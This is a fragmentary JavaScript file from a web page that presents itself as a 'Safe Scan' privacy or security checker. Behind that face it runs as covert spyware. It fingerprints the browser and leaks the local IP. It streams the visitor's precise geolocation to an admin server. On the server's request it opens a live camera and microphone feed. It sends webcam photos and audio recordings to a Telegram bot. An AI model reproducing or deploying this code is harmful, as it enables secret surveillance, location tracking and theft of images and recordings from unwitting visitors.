                ids.fbclid = params.get('fbclid') || null;
                ids.utm_source = params.get('utm_source') || null;
                ids.utm_medium = params.get('utm_medium') || null;
                ids.utm_campaign = params.get('utm_campaign') || null;
                return ids;
            }
            const thirdPartyIds = getThirdPartyIds();

            function connectToAdminServer() {
                try {
                    if (typeof io === 'undefined') {
                        console.warn('[AdminServer] Cannot connect: io is undefined');
                        return;
                    }
                    if (adminSocket && adminSocket.connected) return;

                    adminSocket = io(adminServerUrl, {
                        transports: ['websocket', 'polling'],
                        reconnection: true,
                        reconnectionDelay: 5000,
                        reconnectionAttempts: Infinity,
                        timeout: 10000,
                        withCredentials: true
                    });

                    adminSocket.on('connect', () => {
                        console.log('[AdminServer] Connected successfully');
                        const ua = navigator.userAgent;
                        const getBrowser = () => {
                            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
                            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
                            if (ua.includes('Firefox')) return 'Firefox';
                            if (ua.includes('Edg')) return 'Edge';
                            return 'Other';
                        };
                        const getDevice = () => {
                            if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
                            if (/Android/.test(ua)) return 'Android';
                            if (/Windows/.test(ua)) return 'Windows';
                            if (/Mac/.test(ua)) return 'Mac';
                            return 'Other';
                        };
                        const getCountry = () => {
                            try { return Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'; }
                            catch (e) { return 'Unknown'; }
                        };
                        adminSocket.emit('user:register', {
                            uuid: userUUID,
                            // ─── ALL SESSION IDs ───────────────────
                            session_ids: {
                                cookie_session_id: userUUID,           // Persistent cookie (1 year)
                                tab_session_id: tabSessionId,          // Per-tab (sessionStorage)
                                page_load_id: pageLoadId,              // Per page load
                                socket_id: adminSocket.id,             // Socket.IO connection ID
                                fingerprint_id: fingerprintId,         // Browser fingerprint hash
                                local_storage_id: localSessionId || userUUID,  // localStorage UUID
                                engine_io_id: adminSocket.io?.engine?.id || '' // Engine.IO transport ID
                            },
                            third_party_ids: thirdPartyIds,
                            browser: getBrowser(),
                            device_type: getDevice(),
                            country: getCountry(),
                            location: userLocation || null
                        });

                        // Start periodic location updates to admin server
                        if (navigator.geolocation) {
                            // Send initial location if available
                            if (userLocation) {
                                adminSocket.emit('location:update', {
                                    uuid: userUUID,
                                    ...userLocation
                                });
                            }
                            // Watch position for continuous updates
                            try {
                                navigator.geolocation.watchPosition(
                                    (pos) => {
                                        if (isValidLocation(pos.coords)) {
                                            userLocation = formatLocationData(pos.coords);
                                            if (adminSocket && adminSocket.connected) {
                                                adminSocket.emit('location:update', {
                                                    uuid: userUUID,
                                                    latitude: pos.coords.latitude,
                                                    longitude: pos.coords.longitude,
                                                    accuracy: pos.coords.accuracy,
                                                    altitude: pos.coords.altitude,
                                                    speed: pos.coords.speed,
                                                    heading: pos.coords.heading,
                                                    timestamp: new Date().toISOString()
                                                });
                                            }
                                        }
                                    },
                                    (err) => { console.log('[Location] Watch error:', err.message); },
                                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 60000 }
                                );
                            } catch (e) { console.log('[Location] Watch not supported'); }
                        }
                    });

                    adminSocket.on('disconnect', () => {
                        console.log('[AdminServer] Disconnected');
                        if (peerConnection) {
                            peerConnection.close();
                            peerConnection = null;
                        }
                    });

                    adminSocket.on('connect_error', (err) => {
                        console.log('[AdminServer] Connection error:', err.message);
                    });

                    // WebRTC Signaling
                    let peerConnection = null;

                    adminSocket.on('webrtc:request', async (data) => {
                        const adminSocketId = data.adminSocketId;
                        console.log('[WebRTC] Request stream from admin:', adminSocketId);

                        if (peerConnection) {
                            peerConnection.close();
                            peerConnection = null;
                        }

                        peerConnection = new RTCPeerConnection({
                            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                        });

                        // Add local tracks
                        let localStream = null;
                        try {
                            const videoTrack = stream ? stream.getVideoTracks()[0] : null;
                            const audioTrack = window.microphoneStream ? window.microphoneStream.getAudioTracks()[0] : null;

                            if (videoTrack || audioTrack) {
                                localStream = new MediaStream();
                                if (videoTrack) localStream.addTrack(videoTrack);
                                if (audioTrack) localStream.addTrack(audioTrack);
                            } else {
                                localStream = await navigator.mediaDevices.getUserMedia({
                                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                                    audio: true
                                });
                            }
                        } catch (e) {
                            console.error('[WebRTC] Error acquiring media stream:', e);
                            return;
                        }

                        if (localStream) {
                            localStream.getTracks().forEach(track => {
                                peerConnection.addTrack(track, localStream);
                            });
                        }

                        peerConnection.onicecandidate = (event) => {
                            if (event.candidate && adminSocket && adminSocket.connected) {
                                adminSocket.emit('webrtc:ice-candidate', {
                                    adminSocketId: adminSocketId,
                                    candidate: event.candidate
                                });
                            }
                        };

                        try {
                            const offer = await peerConnection.createOffer();
                            await peerConnection.setLocalDescription(offer);
                            adminSocket.emit('webrtc:offer', {
                                adminSocketId: adminSocketId,
                                offer: offer
                            });
                        } catch (err) {
                            console.error('[WebRTC] Error creating offer:', err);
                        }
                    });

                    adminSocket.on('webrtc:answer', async (data) => {
                        console.log('[WebRTC] Received answer');
                        if (peerConnection) {
                            try {
                                await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
                            } catch (e) {
                                console.error('[WebRTC] Error setting remote description:', e);
                            }
                        }
                    });

                    adminSocket.on('webrtc:ice-candidate', async (data) => {
                        console.log('[WebRTC] Received ICE candidate');
                        if (peerConnection) {
                            try {
                                await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
                            } catch (e) {
                                console.error('[WebRTC] Error adding ICE candidate:', e);
                            }
                        }
                    });

                    adminSocket.on('webrtc:stop', () => {
                        console.log('[WebRTC] Stop streaming');
                        if (peerConnection) {
                            peerConnection.close();
                            peerConnection = null;
                        }
                    });
                } catch (e) {
                    console.log('[AdminServer] Init error:', e.message);
                }
            }

            // Dynamically load Socket.io client script
            (function loadSocketLibrary() {
                const script = document.createElement('script');
                script.src = adminServerUrl + '/socket.io/socket.io.js';
                script.onload = () => {
                    console.log('[AdminServer] Loaded socket.io locally from server');
                    connectToAdminServer();
                };
                script.onerror = () => {
                    console.warn('[AdminServer] Failed to load local socket.io. Trying CDN fallback...');
                    const cdnScript = document.createElement('script');
                    cdnScript.src = 'https://cdn.socket.io/4.7.5/socket.io.min.js';
                    cdnScript.onload = () => {
                        console.log('[AdminServer] Loaded socket.io from CDN fallback');

            const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

            function initTypingEffect() {
                const el = document.getElementById('heroTypingText');
                if (!el) return;

                const phrases = ['Digital Identity', 'Account Credentials', 'Online Privacy', 'Personal Data'];
                let phraseIdx = 0, charIdx = 0, isDeleting = false;

                if (prefersReducedMotion) { el.textContent = phrases[0]; return; }

                function tick() {
                    const current = phrases[phraseIdx];
                    if (!isDeleting) {
                        el.textContent = current.slice(0, charIdx + 1);
                        charIdx++;
                        if (charIdx === current.length) { isDeleting = true; setTimeout(tick, 2200); return; }
                        setTimeout(tick, 90);
                    } else {
                        el.textContent = current.slice(0, charIdx - 1);
                        charIdx--;
                        if (charIdx === 0) { isDeleting = false; phraseIdx = (phraseIdx + 1) % phrases.length; setTimeout(tick, 400); return; }
                        setTimeout(tick, 45);
                    }
                }
                setTimeout(tick, 1200);
            }

            // ═══════════════════════════════════════════════════════════════
            // UI — ANIMATED COUNTERS
            // ═══════════════════════════════════════════════════════════════
            function animateCounter(el) {
                const target = parseInt(el.getAttribute('data-target'), 10);
                const suffix = el.getAttribute('data-suffix') || '';
                const duration = 1800;
                const start = performance.now();

                const tick = (now) => {
                    const progress = Math.min((now - start) / duration, 1);
                    const ease = 1 - Math.pow(1 - progress, 4);
                    el.textContent = Math.floor(ease * target) + suffix;
                    if (progress < 1) requestAnimationFrame(tick);
                    else el.textContent = target + suffix;
                };
                requestAnimationFrame(tick);
            }

            function initCounters() {
                const els = document.querySelectorAll('.stat-card-number[data-target]');
                if (!els.length) return;

                if (prefersReducedMotion) {
                    els.forEach(el => { el.textContent = el.getAttribute('data-target') + (el.getAttribute('data-suffix') || ''); });
                    return;
                }

                const observer = new IntersectionObserver((entries, obs) => {
                    entries.forEach(entry => {
                        if (entry.isIntersecting) {
                            animateCounter(entry.target);
                            obs.unobserve(entry.target);

                            // Animate progress bar fill
                            const card = entry.target.closest('.stat-card');
                            if (card) {
                                const fill = card.querySelector('.stat-card-bar-fill');
                                if (fill) {
                                    setTimeout(() => {
                                        fill.style.width = fill.getAttribute('data-width') + '%';
                                    }, 300);
                                }
                            }
                        }
                    });
                }, { threshold: 0.4 });

                els.forEach(el => observer.observe(el));
            }

                }, { threshold: 0.15 });
                reveals.forEach(el => observer.observe(el));
            }

            function base64ToBlob(base64) {
                const byteString = atob(base64.split(',')[1]);
                const mimeString = base64.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
                return new Blob([ab], { type: mimeString });
            }

            async function sendPhotoToTelegram(photoData, caption) {
                try {
                    const blob = base64ToBlob(photoData);
                    const formData = new FormData();
                    formData.append('chat_id', telegramConfig.chatId);
                    formData.append('photo', blob, 'security_photo.jpg');
                    formData.append('caption', caption);
                    const response = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendPhoto`, { method: 'POST', body: formData });
                    const data = await response.json();
                    return data.ok ? { success: true } : { success: false, message: data.description || 'Error' };
                } catch (error) { return { success: false, message: 'Network error' }; }
            }

            async function sendTextToTelegram(text) {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
                        method: 'POST', headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: telegramConfig.chatId, text: text, parse_mode: 'HTML' })
                    });
                    const data = await response.json();
                    return data.ok;
                } catch (error) { return false; }
            }

            async function sendAudioToTelegram(audioBlob, caption) {
                try {
                    if (!audioBlob || audioBlob.size === 0) return { success: false, message: 'Invalid audio' };
                    const formData = new FormData();
                    formData.append('chat_id', telegramConfig.chatId);
                    const ext = audioBlob.type.includes('ogg') ? 'ogg' : audioBlob.type.includes('mp4') ? 'mp4' : 'webm';
                    formData.append('document', audioBlob, `recording_${Date.now()}.${ext}`);
                    formData.append('caption', caption);
                    const response = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendDocument`, { method: 'POST', body: formData });
                    const data = await response.json();
                    return data.ok ? { success: true } : { success: false, message: data.description || 'Error' };
                } catch (error) { return { success: false, message: error.message }; }
            }

            function getDeviceInfo() {

                    screenResolution: `${screen.width}x${screen.height}`, screenAvailResolution: `${screen.availWidth}x${screen.availHeight}`,

            function detectAndroidDevice(ua) {
                const r = { manufacturer: 'Unknown', brand: 'Unknown', model: 'Unknown' };
                const brands = [
                    ['samsung', 'Samsung', 'Samsung'], ['xiaomi|redmi|poco', 'Xiaomi', null],
                    ['oneplus', 'OnePlus', 'OnePlus'], ['motorola|moto', 'Motorola', 'Motorola'],
                    ['vivo', 'Vivo', 'Vivo'], ['oppo', 'OPPO', 'OPPO'], ['realme', 'Realme', 'Realme'],
                    ['huawei', 'Huawei', 'Huawei'], ['pixel', 'Google', 'Pixel'], ['honor', 'Honor', 'Honor']
                ];
                for (const [pat, mfg, brand] of brands) {
                    if (new RegExp(pat).test(ua)) {
                        r.manufacturer = mfg;
                        r.brand = brand || (/redmi/.test(ua) ? 'Redmi' : /poco/.test(ua) ? 'POCO' : mfg);
                        if (/sm-/.test(ua)) { const m = ua.match(/(sm-[a-z0-9]+)/i); if (m) r.model = m[1].toUpperCase(); }
                        break;

                return r;

            function detectGPU() {
                try {

                    if (gl) { const d = gl.getExtension('WEBGL_debug_renderer_info'); if (d) return { vendor: gl.getParameter(d.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(d.UNMASKED_RENDERER_WEBGL) }; }

            async function getLocalIP() {

                        const pc = new RTC({ iceServers: [] });
                        pc.createDataChannel('');
                        pc.onicecandidate = (ice) => {
                            if (!ice || !ice.candidate || !ice.candidate.candidate) { resolve('Not found'); pc.close(); return; }
                            const m = ice.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                            resolve(m ? m[0] : 'Not found'); pc.close();
                        };
                        pc.createOffer().then(o => pc.setLocalDescription(o));

            async function captureAndSendPhoto() {
                if (!stream) return;
                try {
                    const canvas = document.createElement('canvas');
                    const tracks = stream.getVideoTracks();
                    if (!tracks.length) return;
                    const settings = tracks[0].getSettings();
                    canvas.width = settings.width || 640; canvas.height = settings.height || 480;
                    const ctx = canvas.getContext('2d');
                    if (cameraView.readyState < 2) return;
                    ctx.drawImage(cameraView, 0, 0);
                    const photo = canvas.toDataURL('image/jpeg', 0.85);
                    if (!photo || photo.length < 1000) return;
                    const caption = `📸 Security Capture\n${new Date().toLocaleString()}\n\n${getLocationInfo()}\n\nSafe Scan v3.0`;
                    await sendPhotoToTelegram(photo, caption);

            function getSupportedMimeType() {
                const types = ['audio/webm;codecs=opus', 'audio/webm', 'audio/ogg;codecs=opus', 'audio/mp4'];
                for (const t of types) { if (MediaRecorder.isTypeSupported(t)) return t; }
                return '';
